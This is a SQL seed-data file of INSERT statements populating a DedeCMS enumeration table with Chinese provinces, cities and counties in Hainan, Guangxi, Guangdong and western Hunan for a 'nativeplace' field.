INSERT INTO dede_sys_enum VALUES ('19023', '万宁市', '11003.5', 'nativeplace', '11004', '2');
INSERT INTO dede_sys_enum VALUES ('19022', '文昌市', '11003.4', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19021', '儋州市', '11003.3', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19020', '琼海市', '11003.2', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19019', '五指山市', '11003.1', 'nativeplace', '11003', '2');
INSERT INTO dede_sys_enum VALUES ('19018', '省直辖县级行政单位', '11003', 'nativeplace', '11003', '1');
INSERT INTO dede_sys_enum VALUES ('19017', '三亚市', '11002', 'nativeplace', '11002', '1');
INSERT INTO dede_sys_enum VALUES ('19016', '美兰区', '11001.4', 'nativeplace', '11001', '2');
INSERT INTO dede_sys_enum VALUES ('19015', '琼山区', '11001.3', 'nativeplace', '11001', '2');
INSERT INTO dede_sys_enum VALUES ('19014', '龙华区', '11001.2', 'nativeplace', '11001', '2');
INSERT INTO dede_sys_enum VALUES ('19013', '秀英区', '11001.1', 'nativeplace', '11001', '2');
INSERT INTO dede_sys_enum VALUES ('19012', '海口市', '11001', 'nativeplace', '11001', '1');
INSERT INTO dede_sys_enum VALUES ('19011', '海南省', '11000', 'nativeplace', '11000', '0');
INSERT INTO dede_sys_enum VALUES ('19010', '凭祥市', '10514.7', 'nativeplace', '10515', '2');
INSERT INTO dede_sys_enum VALUES ('19009', '天等县', '10514.6', 'nativeplace', '10515', '2');
INSERT INTO dede_sys_enum VALUES ('19008', '大新县', '10514.5', 'nativeplace', '10515', '2');
INSERT INTO dede_sys_enum VALUES ('19007', '龙州县', '10514.4', 'nativeplace', '10514', '2');
INSERT INTO dede_sys_enum VALUES ('19006', '宁明县', '10514.3', 'nativeplace', '10514', '2');
INSERT INTO dede_sys_enum VALUES ('19005', '扶绥县', '10514.2', 'nativeplace', '10514', '2');
INSERT INTO dede_sys_enum VALUES ('19004', '江洲区', '10514.1', 'nativeplace', '10514', '2');
INSERT INTO dede_sys_enum VALUES ('19003', '崇左市', '10514', 'nativeplace', '10514', '1');
INSERT INTO dede_sys_enum VALUES ('19002', '合山市', '10513.6', 'nativeplace', '10514', '2');
INSERT INTO dede_sys_enum VALUES ('19001', '金秀瑶族自治县', '10513.5', 'nativeplace', '10514', '2');
INSERT INTO dede_sys_enum VALUES ('19000', '武宣县', '10513.4', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18999', '象州县', '10513.3', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18998', '忻城县', '10513.2', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18997', '兴宾区', '10513.1', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18996', '来宾市', '10513', 'nativeplace', '10513', '1');
INSERT INTO dede_sys_enum VALUES ('18995', '宜州市', '10512.11', 'nativeplace', '10512', '2');
INSERT INTO dede_sys_enum VALUES ('18994', '大化瑶族自治县', '10512.10', 'nativeplace', '10512', '2');
INSERT INTO dede_sys_enum VALUES ('18993', '都安瑶族自治县', '10512.9', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18992', '巴马瑶族自治县', '10512.8', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18991', '环江毛南族自治县', '10512.7', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18990', '罗城仫佬族自治县', '10512.6', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18989', '东兰县', '10512.5', 'nativeplace', '10513', '2');
INSERT INTO dede_sys_enum VALUES ('18988', '凤山县', '10512.4', 'nativeplace', '10512', '2');
INSERT INTO dede_sys_enum VALUES ('18987', '天峨县', '10512.3', 'nativeplace', '10512', '2');
INSERT INTO dede_sys_enum VALUES ('18986', '南丹县', '10512.2', 'nativeplace', '10512', '2');
INSERT INTO dede_sys_enum VALUES ('18985', '金城江区', '10512.1', 'nativeplace', '10512', '2');
INSERT INTO dede_sys_enum VALUES ('18984', '河池市', '10512', 'nativeplace', '10512', '1');
INSERT INTO dede_sys_enum VALUES ('18983', '富川瑶族自治县', '10511.4', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18982', '钟山县', '10511.3', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18981', '昭平县', '10511.2', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18980', '八步区', '10511.1', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18979', '贺州市', '10511', 'nativeplace', '10511', '1');
INSERT INTO dede_sys_enum VALUES ('18978', '隆林各族自治县', '10510.12', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18977', '西林县', '10510.11', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18976', '田林县', '10510.10', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18975', '乐业县', '10510.9', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18974', '凌云县', '10510.8', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18973', '那坡县', '10510.7', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18972', '靖西县', '10510.6', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18971', '德保县', '10510.5', 'nativeplace', '10511', '2');
INSERT INTO dede_sys_enum VALUES ('18970', '平果县', '10510.4', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18969', '田东县', '10510.3', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18968', '田阳县', '10510.2', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18967', '右江区', '10510.1', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18966', '百色市', '10510', 'nativeplace', '10510', '1');
INSERT INTO dede_sys_enum VALUES ('18965', '北流市', '10509.6', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18964', '兴业县', '10509.5', 'nativeplace', '10510', '2');
INSERT INTO dede_sys_enum VALUES ('18963', '博白县', '10509.4', 'nativeplace', '10509', '2');
INSERT INTO dede_sys_enum VALUES ('18962', '陆川县', '10509.3', 'nativeplace', '10509', '2');
INSERT INTO dede_sys_enum VALUES ('18961', '容　县', '10509.2', 'nativeplace', '10509', '2');
INSERT INTO dede_sys_enum VALUES ('18960', '玉州区', '10509.1', 'nativeplace', '10509', '2');
INSERT INTO dede_sys_enum VALUES ('18959', '玉林市', '10509', 'nativeplace', '10509', '1');
INSERT INTO dede_sys_enum VALUES ('18958', '桂平市', '10508.5', 'nativeplace', '10509', '2');
INSERT INTO dede_sys_enum VALUES ('18957', '平南县', '10508.4', 'nativeplace', '10508', '2');
INSERT INTO dede_sys_enum VALUES ('18956', '覃塘区', '10508.3', 'nativeplace', '10508', '2');
INSERT INTO dede_sys_enum VALUES ('18955', '港南区', '10508.2', 'nativeplace', '10508', '2');
INSERT INTO dede_sys_enum VALUES ('18954', '港北区', '10508.1', 'nativeplace', '10508', '2');
INSERT INTO dede_sys_enum VALUES ('18953', '贵港市', '10508', 'nativeplace', '10508', '1');
INSERT INTO dede_sys_enum VALUES ('18952', '浦北县', '10507.4', 'nativeplace', '10507', '2');
INSERT INTO dede_sys_enum VALUES ('18951', '灵山县', '10507.3', 'nativeplace', '10507', '2');
INSERT INTO dede_sys_enum VALUES ('18950', '钦北区', '10507.2', 'nativeplace', '10507', '2');
INSERT INTO dede_sys_enum VALUES ('18949', '钦南区', '10507.1', 'nativeplace', '10507', '2');
INSERT INTO dede_sys_enum VALUES ('18948', '钦州市', '10507', 'nativeplace', '10507', '1');
INSERT INTO dede_sys_enum VALUES ('18947', '东兴市', '10506.4', 'nativeplace', '10506', '2');
INSERT INTO dede_sys_enum VALUES ('18946', '上思县', '10506.3', 'nativeplace', '10506', '2');
INSERT INTO dede_sys_enum VALUES ('18945', '防城区', '10506.2', 'nativeplace', '10506', '2');
INSERT INTO dede_sys_enum VALUES ('18944', '港口区', '10506.1', 'nativeplace', '10506', '2');
INSERT INTO dede_sys_enum VALUES ('18943', '防城港市', '10506', 'nativeplace', '10506', '1');
INSERT INTO dede_sys_enum VALUES ('18942', '合浦县', '10505.4', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18941', '铁山港区', '10505.3', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18940', '银海区', '10505.2', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18939', '海城区', '10505.1', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18938', '北海市', '10505', 'nativeplace', '10505', '1');
INSERT INTO dede_sys_enum VALUES ('18937', '岑溪市', '10504.7', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18936', '蒙山县', '10504.6', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18935', '藤　县', '10504.5', 'nativeplace', '10505', '2');
INSERT INTO dede_sys_enum VALUES ('18934', '苍梧县', '10504.4', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18933', '长洲区', '10504.3', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18932', '蝶山区', '10504.2', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18931', '万秀区', '10504.1', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18930', '梧州市', '10504', 'nativeplace', '10504', '1');
INSERT INTO dede_sys_enum VALUES ('18929', '恭城瑶族自治县', '10503.17', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18928', '荔蒲县', '10503.16', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18927', '平乐县', '10503.15', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18926', '资源县', '10503.14', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18925', '龙胜各族自治县', '10503.13', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18924', '灌阳县', '10503.12', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18923', '永福县', '10503.11', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18922', '兴安县', '10503.10', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18921', '全州县', '10503.9', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18920', '灵川县', '10503.8', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18919', '临桂县', '10503.7', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18918', '阳朔县', '10503.6', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18917', '雁山区', '10503.5', 'nativeplace', '10504', '2');
INSERT INTO dede_sys_enum VALUES ('18916', '七星区', '10503.4', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18915', '象山区', '10503.3', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18914', '叠彩区', '10503.2', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18913', '秀峰区', '10503.1', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18912', '桂林市', '10503', 'nativeplace', '10503', '1');
INSERT INTO dede_sys_enum VALUES ('18911', '三江侗族自治县', '10502.10', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18910', '融水苗族自治县', '10502.9', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18909', '融安县', '10502.8', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18908', '鹿寨县', '10502.7', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18907', '柳城县', '10502.6', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18906', '柳江县', '10502.5', 'nativeplace', '10503', '2');
INSERT INTO dede_sys_enum VALUES ('18905', '柳北区', '10502.4', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18904', '柳南区', '10502.3', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18903', '鱼峰区', '10502.2', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18902', '城中区', '10502.1', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18901', '柳州市', '10502', 'nativeplace', '10502', '1');
INSERT INTO dede_sys_enum VALUES ('18900', '横　县', '10501.12', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18899', '宾阳县', '10501.11', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18898', '上林县', '10501.10', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18897', '马山县', '10501.9', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18896', '隆安县', '10501.8', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18895', '武鸣县', '10501.7', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18894', '邕宁区', '10501.6', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18893', '良庆区', '10501.5', 'nativeplace', '10502', '2');
INSERT INTO dede_sys_enum VALUES ('18892', '西乡塘区', '10501.4', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18891', '江南区', '10501.3', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18890', '青秀区', '10501.2', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18889', '兴宁区', '10501.1', 'nativeplace', '10501', '2');
INSERT INTO dede_sys_enum VALUES ('18888', '南宁市', '10501', 'nativeplace', '10501', '1');
INSERT INTO dede_sys_enum VALUES ('18887', '广西壮族自治区', '10500', 'nativeplace', '10500', '0');
INSERT INTO dede_sys_enum VALUES ('18886', '罗定市', '10021.5', 'nativeplace', '10022', '2');
INSERT INTO dede_sys_enum VALUES ('18885', '云安县', '10021.4', 'nativeplace', '10021', '2');
INSERT INTO dede_sys_enum VALUES ('18884', '郁南县', '10021.3', 'nativeplace', '10021', '2');
INSERT INTO dede_sys_enum VALUES ('18883', '新兴县', '10021.2', 'nativeplace', '10021', '2');
INSERT INTO dede_sys_enum VALUES ('18882', '云城区', '10021.1', 'nativeplace', '10021', '2');
INSERT INTO dede_sys_enum VALUES ('18881', '云浮市', '10021', 'nativeplace', '10021', '1');
INSERT INTO dede_sys_enum VALUES ('18880', '普宁市', '10020.5', 'nativeplace', '10021', '2');
INSERT INTO dede_sys_enum VALUES ('18879', '惠来县', '10020.4', 'nativeplace', '10020', '2');
INSERT INTO dede_sys_enum VALUES ('18878', '揭西县', '10020.3', 'nativeplace', '10020', '2');
INSERT INTO dede_sys_enum VALUES ('18877', '揭东县', '10020.2', 'nativeplace', '10020', '2');
INSERT INTO dede_sys_enum VALUES ('18876', '榕城区', '10020.1', 'nativeplace', '10020', '2');
INSERT INTO dede_sys_enum VALUES ('18875', '揭阳市', '10020', 'nativeplace', '10020', '1');
INSERT INTO dede_sys_enum VALUES ('18874', '饶平县', '10019.2', 'nativeplace', '10019', '2');
INSERT INTO dede_sys_enum VALUES ('18873', '潮安县', '10019.1', 'nativeplace', '10019', '2');
INSERT INTO dede_sys_enum VALUES ('18872', '潮州市', '10019', 'nativeplace', '10019', '1');
INSERT INTO dede_sys_enum VALUES ('18871', '中山市', '10018', 'nativeplace', '10018', '1');
INSERT INTO dede_sys_enum VALUES ('18870', '东莞市', '10017', 'nativeplace', '10017', '1');
INSERT INTO dede_sys_enum VALUES ('18869', '连州市', '10016.8', 'nativeplace', '10017', '2');
INSERT INTO dede_sys_enum VALUES ('18868', '英德市', '10016.7', 'nativeplace', '10017', '2');
INSERT INTO dede_sys_enum VALUES ('18867', '清新县', '10016.6', 'nativeplace', '10017', '2');
INSERT INTO dede_sys_enum VALUES ('18866', '连南瑶族自治县', '10016.5', 'nativeplace', '10017', '2');
INSERT INTO dede_sys_enum VALUES ('18865', '连山壮族瑶族自治县', '10016.4', 'nativeplace', '10016', '2');
INSERT INTO dede_sys_enum VALUES ('18864', '阳山县', '10016.3', 'nativeplace', '10016', '2');
INSERT INTO dede_sys_enum VALUES ('18863', '佛冈县', '10016.2', 'nativeplace', '10016', '2');
INSERT INTO dede_sys_enum VALUES ('18862', '清城区', '10016.1', 'nativeplace', '10016', '2');
INSERT INTO dede_sys_enum VALUES ('18861', '清远市', '10016', 'nativeplace', '10016', '1');
INSERT INTO dede_sys_enum VALUES ('18860', '阳春市', '10015.4', 'nativeplace', '10015', '2');
INSERT INTO dede_sys_enum VALUES ('18859', '阳东县', '10015.3', 'nativeplace', '10015', '2');
INSERT INTO dede_sys_enum VALUES ('18858', '阳西县', '10015.2', 'nativeplace', '10015', '2');
INSERT INTO dede_sys_enum VALUES ('18857', '江城区', '10015.1', 'nativeplace', '10015', '2');
INSERT INTO dede_sys_enum VALUES ('18856', '阳江市', '10015', 'nativeplace', '10015', '1');
INSERT INTO dede_sys_enum VALUES ('18855', '东源县', '10014.6', 'nativeplace', '10015', '2');
INSERT INTO dede_sys_enum VALUES ('18854', '和平县', '10014.5', 'nativeplace', '10015', '2');
INSERT INTO dede_sys_enum VALUES ('18853', '连平县', '10014.4', 'nativeplace', '10014', '2');
INSERT INTO dede_sys_enum VALUES ('18852', '龙川县', '10014.3', 'nativeplace', '10014', '2');
INSERT INTO dede_sys_enum VALUES ('18851', '紫金县', '10014.2', 'nativeplace', '10014', '2');
INSERT INTO dede_sys_enum VALUES ('18850', '源城区', '10014.1', 'nativeplace', '10014', '2');
INSERT INTO dede_sys_enum VALUES ('18849', '河源市', '10014', 'nativeplace', '10014', '1');
INSERT INTO dede_sys_enum VALUES ('18848', '陆丰市', '10013.4', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18847', '陆河县', '10013.3', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18846', '海丰县', '10013.2', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18845', '城　区', '10013.1', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18844', '汕尾市', '10013', 'nativeplace', '10013', '1');
INSERT INTO dede_sys_enum VALUES ('18843', '兴宁市', '10012.8', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18842', '蕉岭县', '10012.7', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18841', '平远县', '10012.6', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18840', '五华县', '10012.5', 'nativeplace', '10013', '2');
INSERT INTO dede_sys_enum VALUES ('18839', '丰顺县', '10012.4', 'nativeplace', '10012', '2');
INSERT INTO dede_sys_enum VALUES ('18838', '大埔县', '10012.3', 'nativeplace', '10012', '2');
INSERT INTO dede_sys_enum VALUES ('18837', '梅　县', '10012.2', 'nativeplace', '10012', '2');
INSERT INTO dede_sys_enum VALUES ('18836', '梅江区', '10012.1', 'nativeplace', '10012', '2');
INSERT INTO dede_sys_enum VALUES ('18835', '梅州市', '10012', 'nativeplace', '10012', '1');
INSERT INTO dede_sys_enum VALUES ('18834', '龙门县', '10011.5', 'nativeplace', '10012', '2');
INSERT INTO dede_sys_enum VALUES ('18833', '惠东县', '10011.4', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18832', '博罗县', '10011.3', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18831', '惠阳区', '10011.2', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18830', '惠城区', '10011.1', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18829', '惠州市', '10011', 'nativeplace', '10011', '1');
INSERT INTO dede_sys_enum VALUES ('18828', '四会市', '10010.8', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18827', '高要市', '10010.7', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18826', '德庆县', '10010.6', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18825', '封开县', '10010.5', 'nativeplace', '10011', '2');
INSERT INTO dede_sys_enum VALUES ('18824', '怀集县', '10010.4', 'nativeplace', '10010', '2');
INSERT INTO dede_sys_enum VALUES ('18823', '广宁县', '10010.3', 'nativeplace', '10010', '2');
INSERT INTO dede_sys_enum VALUES ('18822', '鼎湖区', '10010.2', 'nativeplace', '10010', '2');
INSERT INTO dede_sys_enum VALUES ('18821', '端州区', '10010.1', 'nativeplace', '10010', '2');
INSERT INTO dede_sys_enum VALUES ('18820', '肇庆市', '10010', 'nativeplace', '10010', '1');
INSERT INTO dede_sys_enum VALUES ('18819', '信宜市', '10009.6', 'nativeplace', '10010', '2');
INSERT INTO dede_sys_enum VALUES ('18818', '化州市', '10009.5', 'nativeplace', '10010', '2');
INSERT INTO dede_sys_enum VALUES ('18817', '高州市', '10009.4', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18816', '电白县', '10009.3', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18815', '茂港区', '10009.2', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18814', '茂南区', '10009.1', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18813', '茂名市', '10009', 'nativeplace', '10009', '1');
INSERT INTO dede_sys_enum VALUES ('18812', '吴川市', '10008.9', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18811', '雷州市', '10008.8', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18810', '廉江市', '10008.7', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18809', '徐闻县', '10008.6', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18808', '遂溪县', '10008.5', 'nativeplace', '10009', '2');
INSERT INTO dede_sys_enum VALUES ('18807', '麻章区', '10008.4', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18806', '坡头区', '10008.3', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18805', '霞山区', '10008.2', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18804', '赤坎区', '10008.1', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18803', '湛江市', '10008', 'nativeplace', '10008', '1');
INSERT INTO dede_sys_enum VALUES ('18802', '恩平市', '10007.7', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18801', '鹤山市', '10007.6', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18800', '开平市', '10007.5', 'nativeplace', '10008', '2');
INSERT INTO dede_sys_enum VALUES ('18799', '台山市', '10007.4', 'nativeplace', '10007', '2');
INSERT INTO dede_sys_enum VALUES ('18798', '新会区', '10007.3', 'nativeplace', '10007', '2');
INSERT INTO dede_sys_enum VALUES ('18797', '江海区', '10007.2', 'nativeplace', '10007', '2');
INSERT INTO dede_sys_enum VALUES ('18796', '蓬江区', '10007.1', 'nativeplace', '10007', '2');
INSERT INTO dede_sys_enum VALUES ('18795', '江门市', '10007', 'nativeplace', '10007', '1');
INSERT INTO dede_sys_enum VALUES ('18794', '高明区', '10006.5', 'nativeplace', '10007', '2');
INSERT INTO dede_sys_enum VALUES ('18793', '三水区', '10006.4', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18792', '顺德区', '10006.3', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18791', '南海区', '10006.2', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18790', '禅城区', '10006.1', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18789', '佛山市', '10006', 'nativeplace', '10006', '1');
INSERT INTO dede_sys_enum VALUES ('18788', '南澳县', '10005.7', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18787', '澄海区', '10005.6', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18786', '潮南区', '10005.5', 'nativeplace', '10006', '2');
INSERT INTO dede_sys_enum VALUES ('18785', '潮阳区', '10005.4', 'nativeplace', '10005', '2');
INSERT INTO dede_sys_enum VALUES ('18784', '濠江区', '10005.3', 'nativeplace', '10005', '2');
INSERT INTO dede_sys_enum VALUES ('18783', '金平区', '10005.2', 'nativeplace', '10005', '2');
INSERT INTO dede_sys_enum VALUES ('18782', '龙湖区', '10005.1', 'nativeplace', '10005', '2');
INSERT INTO dede_sys_enum VALUES ('18781', '汕头市', '10005', 'nativeplace', '10005', '1');
INSERT INTO dede_sys_enum VALUES ('18780', '金湾区', '10004.3', 'nativeplace', '10004', '2');
INSERT INTO dede_sys_enum VALUES ('18779', '斗门区', '10004.2', 'nativeplace', '10004', '2');
INSERT INTO dede_sys_enum VALUES ('18778', '洲区', '10004.1', 'nativeplace', '10004', '2');
INSERT INTO dede_sys_enum VALUES ('18777', '珠海市', '10004', 'nativeplace', '10004', '1');
INSERT INTO dede_sys_enum VALUES ('18776', '盐田区', '10003.6', 'nativeplace', '10004', '2');
INSERT INTO dede_sys_enum VALUES ('18775', '龙岗区', '10003.5', 'nativeplace', '10004', '2');
INSERT INTO dede_sys_enum VALUES ('18774', '宝安区', '10003.4', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18773', '南山区', '10003.3', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18772', '福田区', '10003.2', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18771', '罗湖区', '10003.1', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18770', '深圳市', '10003', 'nativeplace', '10003', '1');
INSERT INTO dede_sys_enum VALUES ('18769', '南雄市', '10002.10', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18768', '乐昌市', '10002.9', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18767', '新丰县', '10002.8', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18766', '乳源瑶族自治县', '10002.7', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18765', '翁源县', '10002.6', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18764', '仁化县', '10002.5', 'nativeplace', '10003', '2');
INSERT INTO dede_sys_enum VALUES ('18763', '始兴县', '10002.4', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18762', '曲江区', '10002.3', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18761', '浈江区', '10002.2', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18760', '武江区', '10002.1', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18759', '韶关市', '10002', 'nativeplace', '10002', '1');
INSERT INTO dede_sys_enum VALUES ('18758', '从化市', '10001.12', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18757', '增城市', '10001.11', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18756', '花都区', '10001.10', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18755', '番禺区', '10001.9', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18754', '黄埔区', '10001.8', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18753', '白云区', '10001.7', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18752', '芳村区', '10001.6', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18751', '天河区', '10001.5', 'nativeplace', '10002', '2');
INSERT INTO dede_sys_enum VALUES ('18750', '海珠区', '10001.4', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18749', '越秀区', '10001.3', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18748', '荔湾区', '10001.2', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18747', '东山区', '10001.1', 'nativeplace', '10001', '2');
INSERT INTO dede_sys_enum VALUES ('18746', '广州市', '10001', 'nativeplace', '10001', '1');
INSERT INTO dede_sys_enum VALUES ('18745', '广东省', '10000', 'nativeplace', '10000', '0');
INSERT INTO dede_sys_enum VALUES ('18744', '龙山县', '9514.8', 'nativeplace', '9515', '2');
INSERT INTO dede_sys_enum VALUES ('18743', '永顺县', '9514.7', 'nativeplace', '9515', '2');
INSERT INTO dede_sys_enum VALUES ('18742', '古丈县', '9514.6', 'nativeplace', '9515', '2');
INSERT INTO dede_sys_enum VALUES ('18741', '保靖县', '9514.5', 'nativeplace', '9515', '2');
INSERT INTO dede_sys_enum VALUES ('18740', '花垣县', '9514.4', 'nativeplace', '9514', '2');
INSERT INTO dede_sys_enum VALUES ('18739', '凤凰县', '9514.3', 'nativeplace', '9514', '2');
INSERT INTO dede_sys_enum VALUES ('18738', '泸溪县', '9514.2', 'nativeplace', '9514', '2');
INSERT INTO dede_sys_enum VALUES ('18737', '吉首市', '9514.1', 'nativeplace', '9514', '2');
INSERT INTO dede_sys_enum VALUES ('18736', '湘西土家族苗族自治州', '9514', 'nativeplace', '9514', '1');
